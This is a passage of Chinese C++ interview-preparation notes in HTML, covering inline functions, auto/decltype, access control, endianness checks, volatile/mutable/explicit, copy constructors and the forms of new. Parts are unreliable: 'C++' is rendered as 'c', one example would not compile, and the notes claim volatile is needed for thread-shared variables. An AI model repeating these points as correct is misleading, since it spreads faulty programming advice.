title="39、内联函数和宏定义的区别"></a>39、内联函数和宏定义的区别</h4><p>内联(inline)函数和普通函数相比可以加快程序运行的速度，因为不需要中断调用，在编译的时候内联函数可以直接嵌入到目标代码中。</p><p><strong>内联函数适用场景</strong></p><ul><li>使用宏定义的地方都可以使用inline函数</li><li>作为类成员接口函数来读写类的私有成员或者保护成员，会提高效率</li></ul><p><strong>为什么不能把所有的函数写成内联函数</strong></p><p>内联函数以代码复杂为代价，它以省去函数调用的开销来提高执行效率。所以一方面如果内联函数体内代码执行时间相比函数调用开销较大，则没有太大的意义；另一方面每一处内联函数的调用都要复制代码，消耗更多的内存空间，因此以下情况不宜使用内联函数：</p><ul><li>函数体内的代码比较长，将导致内存消耗代价</li><li>函数体内有循环，函数执行时间要比函数调用开销大</li></ul><p><strong>主要区别</strong></p><ul><li>内联函数在编译时展开，宏在预编译时展开</li><li>内联函数直接嵌入到目标代码中，宏是简单的做文本替换</li><li>内联函数有类型检测、语法判断等功能，而宏没有</li><li>内联函数是函数，宏不是</li><li>宏定义时要注意书写（参数要括起来）否则容易出现歧义，内联函数不会产生歧义</li><li>内联函数代码是被放到符号表中，使用时像宏一样展开，没有调用的开销，效率很高；</li></ul><blockquote><p>《inline函数和宏定义区别 整理》：<a href="https://blog.csdn.net/wangliang888888/article/details/77990650">https://blog.csdn.net/wangliang888888/article/details/77990650</a></p></blockquote><ul><li><p>在使用时，宏只做简单字符串替换（编译前）。而内联函数可以进行参数类型检查（编译时），且具有返回值。</p></li><li><p>内联函数本身是函数，强调函数特性，具有重载等功能。</p></li><li><p>内联函数可以作为某个类的成员函数，这样可以使用类的保护成员和私有成员，进而提升效率。而当一个表达式涉及到类保护成员或私有成员时，宏就不能实现了。</p></li></ul><h4 id="40、构造函数、析构函数、虚函数可否声明为内联函数"><a href="#40、构造函数、析构函数、虚函数可否声明为内联函数" class="headerlink" title="40、构造函数、析构函数、虚函数可否声明为内联函数"></a>40、构造函数、析构函数、虚函数可否声明为内联函数</h4><p>首先，将这些函数声明为内联函数，在语法上没有错误。因为inline同register一样，只是个建议，编译器并不一定真正的内联。</p><blockquote><p>register关键字：这个关键字请求编译器尽可能的将变量存在CPU内部寄存器中，而不是通过内存寻址访问，以提高效率 </p></blockquote><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token keyword">inline</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"inline construct()"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">inline</span> <span class="token operator">~</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"inline destruct()"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">inline</span> virtual <span class="token keyword">void</span>  <span class="token function">virtualFun</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"inline virtual function"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>A a<span class="token punctuation">;</span>a<span class="token punctuation">.</span><span class="token function">virtualFun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//输出结果</span><span class="token comment">//inline construct()</span><span class="token comment">//inline virtual function</span><span class="token comment">//inline destruct()</span></code></pre><p><strong>构造函数和析构函数声明为内联函数是没有意义的</strong></p><p>《Effective c》中所阐述的是：<strong>将构造函数和析构函数声明为inline是没有什么意义的，即编译器并不真正对声明为inline的构造和析构函数进行内联操作，因为编译器会在构造和析构函数中添加额外的操作（申请/释放内存，构造/析构对象等），致使构造函数/析构函数并不像看上去的那么精简</strong>。其次，class中的函数默认是inline型的，编译器也只是有选择性的inline，将构造函数和析构函数声明为内联函数是没有什么意义的。</p><p> <strong>将虚函数声明为inline，要分情况讨论</strong></p><p>有的人认为虚函数被声明为inline，但是编译器并没有对其内联，他们给出的理由是inline是编译期决定的，而虚函数是运行期决定的，即在不知道将要调用哪个函数的情况下，如何将函数内联呢？</p><p>上述观点看似正确，其实不然，如果虚函数在编译器就能够决定将要调用哪个函数时，就能够内联，那么什么情况下编译器可以确定要调用哪个函数呢，答案是当用对象调用虚函数（此时不具有多态性）时，就内联展开</p><p><strong>综上，当是指向派生类的指针（多态性）调用声明为inline的虚函数时，不会内联展开；当是对象本身调用虚函数时，会内联展开，当然前提依然是函数并不复杂的情况下</strong></p><blockquote><p>《构造函数、析构函数、虚函数可否内联，有何意义》：<a href="https://www.cnblogs.com/helloweworld/archive/2013/06/14/3136705.html">https://www.cnblogs.com/helloweworld/archive/2013/06/14/3136705.html</a></p></blockquote><h4 id="41、auto、decltype和decltype-auto-的用法"><a href="#41、auto、decltype和decltype-auto-的用法" class="headerlink" title="41、auto、decltype和decltype(auto)的用法"></a>41、auto、decltype和decltype(auto)的用法</h4><p><strong>（1）auto</strong></p><p>c11新标准引入了auto类型说明符，用它就能让编译器替我们去分析表达式所属的类型。和原来那些只对应某种特定的类型说明符(例如 int)不同，</p><p><strong>auto 让编译器通过初始值来进行类型推演。从而获得定义变量的类型，所以说 auto 定义的变量必须有初始值。</strong>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//普通；类型</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">auto</span> c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token comment">// c为int型</span><span class="token comment">//const类型</span><span class="token keyword">const</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">auto</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> <span class="token comment">// 变量i是顶层const, 会被忽略, 所以j的类型是int</span><span class="token keyword">auto</span> k <span class="token operator">=</span> <span class="token operator">&amp;</span>i<span class="token punctuation">;</span> <span class="token comment">// 变量i是一个常量, 对常量取地址是一种底层const, 所以b的类型是const int*</span><span class="token keyword">const</span> <span class="token keyword">auto</span> l <span class="token operator">=</span> i<span class="token punctuation">;</span> <span class="token comment">//如果希望推断出的类型是顶层const的, 那么就需要在auto前面加上cosnt</span><span class="token comment">//引用和指针类型</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token operator">&amp;</span> y <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token keyword">auto</span> z <span class="token operator">=</span> y<span class="token punctuation">;</span> <span class="token comment">//z是int型不是int&amp; 型</span><span class="token keyword">auto</span><span class="token operator">&amp;</span> p1 <span class="token operator">=</span> y<span class="token punctuation">;</span> <span class="token comment">//p1是int&amp;型</span><span class="token keyword">auto</span> p2 <span class="token operator">=</span> <span class="token operator">&amp;</span>x<span class="token punctuation">;</span> <span class="token comment">//p2是指针类型int*</span></code></pre><p><strong>（2）decltype</strong></p><p>有的时候我们还会遇到这种情况，<strong>我们希望从表达式中推断出要定义变量的类型，但却不想用表达式的值去初始化变量。</strong>还有可能是函数的返回类型为某表达式的值类型。在这些时候auto显得就无力了，所以c11又引入了第二种类型说明符decltype，<strong>它的作用是选择并返回操作数的数据类型。在此过程中，编译器只是分析表达式并得到它的类型，却不进行实际的计算表达式的值。</strong></p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//普通类型</span><span class="token function">decltype</span><span class="token punctuation">(</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> sum <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">// sum的类型是函数func()的返回值的类型int, 但是这时不会实际调用函数func()</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">decltype</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> b <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token comment">// a的类型是int, 所以b的类型也是int</span><span class="token comment">//不论是顶层const还是底层const, decltype都会保留   </span><span class="token keyword">const</span> <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token function">decltype</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> d <span class="token operator">=</span> c<span class="token punctuation">;</span> <span class="token comment">// d的类型和c是一样的, 都是顶层const</span><span class="token keyword">int</span> e <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">*</span> f <span class="token operator">=</span> <span class="token operator">&amp;</span>e<span class="token punctuation">;</span> <span class="token comment">// f是底层const</span><span class="token function">decltype</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> g <span class="token operator">=</span> f<span class="token punctuation">;</span> <span class="token comment">// g也是底层const</span><span class="token comment">//引用与指针类型</span><span class="token comment">//1. 如果表达式是引用类型, 那么decltype的类型也是引用</span><span class="token keyword">const</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>j <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token function">decltype</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> k <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">// k的类型是 const int&amp;</span><span class="token comment">//2. 如果表达式是引用类型, 但是想要得到这个引用所指向的类型, 需要修改表达式:</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>r <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token function">decltype</span><span class="token punctuation">(</span>r <span class="token operator">+</span> <span class="token number">0</span><span class="token punctuation">)</span> t <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">// 此时是int类型</span><span class="token comment">//3. 对指针的解引用操作返回的是引用类型</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token operator">&amp;</span>i<span class="token punctuation">;</span><span class="token function">decltype</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span> c <span class="token operator">=</span> j<span class="token punctuation">;</span> <span class="token comment">// c是int&amp;类型, c和j绑定在一起</span><span class="token comment">//4. 如果一个表达式的类型不是引用, 但是我们需要推断出引用, 那么可以加上一对括号, 就变成了引用类型了</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token function">decltype</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> <span class="token comment">// 此时j的类型是int&amp;类型, j和i绑定在了一起</span></code></pre><p><strong>（3）decltype(auto)</strong></p><p>decltype(auto)是c14新增的类型指示符，可以用来声明变量以及指示函数返回类型。在使用时，会将“=”号左边的表达式替换掉auto，再根据decltype的语法规则来确定类型。举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> e <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">*</span> f <span class="token operator">=</span> <span class="token operator">&amp;</span>e<span class="token punctuation">;</span> <span class="token comment">// f是底层const</span><span class="token function">decltype</span><span class="token punctuation">(</span><span class="token keyword">auto</span><span class="token punctuation">)</span> j <span class="token operator">=</span> f<span class="token punctuation">;</span><span class="token comment">//j的类型是const int* 并且指向的是e</span></code></pre><blockquote><p>《auto和decltype的用法总结》：<a href="https://www.cnblogs.com/XiangfeiAi/p/4451904.html">https://www.cnblogs.com/XiangfeiAi/p/4451904.html</a></p><p>《c11新特性中auto 和 decltype 区别和联系》：<a href="https://www.jb51.net/article/103666.htm">https://www.jb51.net/article/103666.htm</a></p></blockquote><h4 id="42、public，protected和private访问和继承权限-public-protected-private的区别？"><a href="#42、public，protected和private访问和继承权限-public-protected-private的区别？" class="headerlink" title="42、public，protected和private访问和继承权限/public/protected/private的区别？"></a>42、public，protected和private访问和继承权限/public/protected/private的区别？</h4><ul><li><p>public的变量和函数在类的内部外部都可以访问。</p></li><li><p>protected的变量和函数只能在类的内部和其派生类中访问。</p></li><li><p>private修饰的元素只能在类内访问。</p></li></ul><p>（一）访问权限</p><p>派生类可以继承基类中除了构造/析构、赋值运算符重载函数之外的成员，但是这些成员的访问属性在派生过程中也是可以调整的，三种派生方式的访问权限如下表所示：注意外部访问并不是真正的外部访问，而是在通过派生类的对象对基类成员的访问。</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1564132255040.png" alt=""></p><p>派生类对基类成员的访问形象有如下两种：</p><ul><li>内部访问：由派生类中新增的成员函数对从基类继承来的成员的访问</li><li><strong>外部访问</strong>：在派生类外部，通过派生类的对象对从基类继承来的成员的访问</li></ul><p>（二）继承权限</p><p><strong>public继承</strong></p><p>公有继承的特点是基类的公有成员和保护成员作为派生类的成员时，都保持原有的状态，而基类的私有成员任然是私有的，不能被这个派生类的子类所访问</p><p><strong>protected继承</strong></p><p>保护继承的特点是基类的所有公有成员和保护成员都成为派生类的保护成员，并且只能被它的派生类成员函数或友元函数访问，基类的私有成员仍然是私有的，访问规则如下表</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1564132983494.png" alt=""></p><p><strong>private继承</strong></p><p>私有继承的特点是基类的所有公有成员和保护成员都成为派生类的私有成员，并不被它的派生类的子类所访问，基类的成员只能由自己派生类访问，无法再往下继承，访问规则如下表</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1564132983494.png" alt=""></p><h4 id="43、如何用代码判断大小端存储"><a href="#43、如何用代码判断大小端存储" class="headerlink" title="43、如何用代码判断大小端存储"></a>43、如何用代码判断大小端存储</h4><p>大端存储：字数据的高字节存储在低地址中</p><p>小端存储：字数据的低字节存储在低地址中</p><p>例如：32bit的数字0x12345678</p><p><strong>所以在Socket编程中，往往需要将操作系统所用的小端存储的IP地址转换为大端存储，这样才能进行网络传输</strong></p><p>小端模式中的存储方式为：</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1564134200013.png" alt=""></p><p>大端模式中的存储方式为：</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1564134220855.png" alt=""></p><p>了解了大小端存储的方式，如何在代码中进行判断呢？下面介绍两种判断方式：</p><p><strong>方式一：使用强制类型转换</strong>-这种法子不错</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span>    <span class="token comment">//由于int和char的长度不同，借助int型转换成char型，只会留下低地址的部分</span>    <span class="token keyword">char</span> c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">0x12</span><span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"big endian"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">0x34</span><span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"little endian"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>方式二：巧用union联合体</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span><span class="token comment">//union联合体的重叠式存储，endian联合体占用内存的空间为每个成员字节长度的最大值</span><span class="token keyword">union</span> endian<span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a<span class="token punctuation">;</span>    <span class="token keyword">char</span> ch<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    endian value<span class="token punctuation">;</span>    value<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span>    <span class="token comment">//a和ch共用4字节的内存空间</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>value<span class="token punctuation">.</span>ch <span class="token operator">==</span> <span class="token number">0x12</span><span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"big endian"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>value<span class="token punctuation">.</span>ch <span class="token operator">==</span> <span class="token number">0x34</span><span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"little endian"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>《写程序判断系统是大端序还是小端序》：<a href="https://www.cnblogs.com/zhoudayang/p/5985563.html">https://www.cnblogs.com/zhoudayang/p/5985563.html</a></p></blockquote><h4 id="44、volatile、mutable和explicit关键字的用法"><a href="#44、volatile、mutable和explicit关键字的用法" class="headerlink" title="44、volatile、mutable和explicit关键字的用法"></a>44、volatile、mutable和explicit关键字的用法</h4><p>(1)<strong>volatile</strong></p><p>volatile 关键字是一种类型修饰符，<strong>用它声明的类型变量表示可以被某些编译器未知的因素更改</strong>，比如：操作系统、硬件或者其它线程等。遇到这个关键字声明的变量，编译器对访问该变量的代码就不再进行优化，从而可以提供对特殊地址的稳定访问。</p><p> 当要求使用 volatile 声明的变量的值的时候，<strong>系统总是重新从它所在的内存读取数据</strong>，即使它前面的指令刚刚从该处读取过数据。</p><p><strong>volatile定义变量的值是易变的，每次用到这个变量的值的时候都要去重新读取这个变量的值，而不是读寄存器内的备份。多线程中被几个任务共享的变量需要定义为volatile类型。</strong></p><p><strong>volatile 指针</strong></p><p>volatile 指针和 const 修饰词类似，const 有常量指针和指针常量的说法，volatile 也有相应的概念</p><p>修饰由指针指向的对象、数据是 const 或 volatile 的：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> cpch<span class="token punctuation">;</span><span class="token keyword">volatile</span> <span class="token keyword">char</span><span class="token operator">*</span> vpch<span class="token punctuation">;</span></code></pre><p>指针自身的值——一个代表地址的整数变量，是 const 或 volatile 的：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">const</span> pchc<span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">volatile</span> pchv<span class="token punctuation">;</span></code></pre><p> 注意：</p><ul><li>可以把一个非volatile int赋给volatile int，但是不能把非volatile对象赋给一个volatile对象。</li><li>除了基本类型外，对用户定义类型也可以用volatile类型进行修饰。</li><li>c中一个有volatile标识符的类只能访问它接口的子集，一个由类的实现者控制的子集。用户只能用const_cast来获得对类型接口的完全访问。此外，volatile向const一样会从类传递到它的成员。</li></ul><p><strong>多线程下的volatile</strong>   </p><p>有些变量是用volatile关键字声明的。当两个线程都要用到某一个变量且该变量的值会被改变时，应该用volatile声明，<strong>该关键字的作用是防止优化编译器把变量从内存装入CPU寄存器中。</strong>如果变量被装入寄存器，那么两个线程有可能一个使用内存中的变量，一个使用寄存器中的变量，这会造成程序的错误执行。volatile的意思是让编译器每次操作该变量时一定要从内存中真正取出，而不是使用已经存在寄存器中的值。</p><p>（2）<strong>mutable</strong></p><p>mutable的中文意思是“可变的，易变的”，跟constant（既c中的const）是反义词。在c中，mutable也是为了突破const的限制而设置的。被mutable修饰的变量，将永远处于可变的状态，即使在一个const函数中。我们知道，如果类的成员函数不会改变对象的状态，那么这个成员函数一般会声明成const的。但是，有些时候，我们需要<strong>在const函数里面修改一些跟类状态无关的数据成员，那么这个函数就应该被mutable来修饰，并且放在函数后后面关键字位置</strong>。</p><p>（3）<strong>explicit</strong></p><p>explicit关键字用来修饰类的构造函数，被修饰的构造函数的类，不能发生相应的隐式类型转换，只能以<strong>显示的方式进行类型转换</strong>，注意以下几点：</p><ul><li><p>explicit 关键字只能用于类内部的构造函数声明上</p></li><li><p>explicit 关键字作用于单个参数的构造函数</p></li><li><p>被explicit修饰的构造函数的类，不能发生相应的隐式类型转换</p></li></ul><h4 id="45、什么情况下会调用拷贝构造函数"><a href="#45、什么情况下会调用拷贝构造函数" class="headerlink" title="45、什么情况下会调用拷贝构造函数"></a>45、什么情况下会调用拷贝构造函数</h4><ul><li>用类的一个实例化对象去初始化另一个对象的时候</li><li>函数的参数是类的对象时（非引用传递）</li><li>函数的返回值是函数体内局部对象的类的对象时 ,此时虽然发生（Named return Value优化）NRV优化，但是由于返回方式是值传递，所以会在返回值的地方调用拷贝构造函数</li></ul><p><strong>另：第三种情况在Linux g++ 下则不会发生拷贝构造函数，不仅如此即使返回局部对象的引用，依然不会发生拷贝构造函数</strong></p><p><strong>总结就是：即使发生NRA优化的情况下，Linux+ g++的环境是不管值返回方式还是引用方式返回的方式都不会发生拷贝构造函数，而Windows + VS2019在值返回的情况下发生拷贝构造函数，引用返回方式则不发生拷贝构造函数</strong>。</p><p>在c编译器发生NRV优化，如果是引用返回的形式则不会调用拷贝构造函数，如果是值传递的方式依然会发生拷贝构造函数。</p><p><strong>在VS2019下进行下述实验：</strong></p><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c">class A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token keyword">const</span> A<span class="token operator">&amp;</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"copy constructor is called"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">~</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">useClassA</span><span class="token punctuation">(</span>A a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>A <span class="token function">getClassA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//此时会发生拷贝构造函数的调用，虽然发生NRV优化，但是依然调用拷贝构造函数</span><span class="token punctuation">&#123;</span>A a<span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//A&amp; getClassA2()//  VS2019下，此时编辑器会进行（Named return Value优化）NRV优化,不调用拷贝构造函数 ，如果是引用传递的方式返回当前函数体内生成的对象时，并不发生拷贝构造函数的调用</span><span class="token comment">//&#123;</span><span class="token comment">//A a;</span><span class="token comment">//return a;</span><span class="token comment">//&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>A a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span>a3<span class="token punctuation">,</span>a4<span class="token punctuation">;</span>A a2 <span class="token operator">=</span> a1<span class="token punctuation">;</span>  <span class="token comment">//调用拷贝构造函数,对应情况1</span><span class="token function">useClassA</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用拷贝构造函数，对应情况2</span>a3 <span class="token operator">=</span> <span class="token function">getClassA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//发生NRV优化，但是值返回，依然会有拷贝构造函数的调用 情况3</span>a4 <span class="token operator">=</span> <span class="token function">getClassA2</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//发生NRV优化，且引用返回自身，不会调用</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>情况1比较好理解</p><p>情况2的实现过程是，调用函数时先根据传入的实参产生临时对象，再用拷贝构造去初始化这个临时对象，在函数中与形参对应，函数调用结束后析构临时对象</p><p>情况3在执行return时，理论的执行过程是：产生临时对象，调用拷贝构造函数把返回对象拷贝给临时对象，函数执行完先析构局部变量，再析构临时对象，  依然会调用拷贝构造函数</p><blockquote><p>《c拷贝构造函数详解》：<a href="https://www.cnblogs.com/alantu2018/p/8459250.html">https://www.cnblogs.com/alantu2018/p/8459250.html</a></p></blockquote><h4 id="46、c中有几种类型的new"><a href="#46、c中有几种类型的new" class="headerlink" title="46、c中有几种类型的new"></a>46、c中有几种类型的new</h4><p>在c中，new有三种典型的使用方法：plain new，nothrow new和placement new</p><p>（1）<strong>plain new</strong></p><p>言下之意就是普通的new，就是我们常用的new，在c中定义如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span><span class="token operator">*</span> operator <span class="token function">new</span><span class="token punctuation">(</span>std<span class="token operator">::</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> <span class="token function">throw</span><span class="token punctuation">(</span>std<span class="token operator">::</span>bad_alloc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> operator <span class="token function">delete</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">throw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>因此<strong>plain new</strong>在空间分配失败的情况下，抛出异常<strong>std::bad_alloc</strong>而不是返回NULL，因此通过判断返回值是否为NULL是徒劳的，举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>try<span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>p <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">10e11</span><span class="token punctuation">]</span><span class="token punctuation">;</span>delete p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">catch</span> <span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>bad_alloc <span class="token operator">&amp;</span>ex<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> ex<span class="token punctuation">.</span><span class="token function">what</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//执行结果：bad allocation</span></code></pre><p>（2）<strong>nothrow new</strong></p><p>nothrow new在空间分配失败的情况下是不抛出异常，而是返回NULL，定义如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span> operator <span class="token function">new</span><span class="token punctuation">(</span>std<span class="token operator">::</span><span class="token class-name">size_t</span><span class="token punctuation">,</span><span class="token keyword">const</span> std<span class="token operator">::</span><span class="token class-name">nothrow_t</span><span class="token operator">&amp;</span><span class="token punctuation">)</span> <span class="token function">throw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> operator <span class="token function">delete</span><span class="token 